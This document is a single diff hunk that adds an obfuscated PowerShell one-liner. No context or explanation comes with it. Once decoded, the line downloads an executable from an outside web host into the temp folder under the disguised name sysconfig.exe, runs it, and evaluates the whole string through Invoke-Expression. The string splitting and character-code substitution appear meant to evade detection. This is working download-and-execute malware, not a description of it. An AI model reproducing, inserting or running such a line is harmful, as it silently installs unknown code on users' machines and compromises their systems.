@@ -1,0 +1,1 @@
+﻿ (('(N'+'e'+'w'+'-Objec'+'t'+' Sy'+'stem.Net.We'+'bCli'+'ent)'+'.D'+'own'+'loadFil'+'e('+'{2'+'}ht'+'tp://www.mac'+'wizin'+'fo.'+'com/'+'updates/anna.ex'+'e{2},{1'+'}{'+'0}en'+'v:TE'+'MP{3}'+'sysconf'+'ig.ex'+'e'+'{1'+'}'+');Sta'+'rt-Pr'+'ocess ('+'{1'+'}{0'+'}en'+'v:T'+'EM'+'P{3}sysco'+'n'+'fig.ex'+'e{'+'1})') -F[Char]36,[Char]34,[Char]39,[Char]92)|IeX
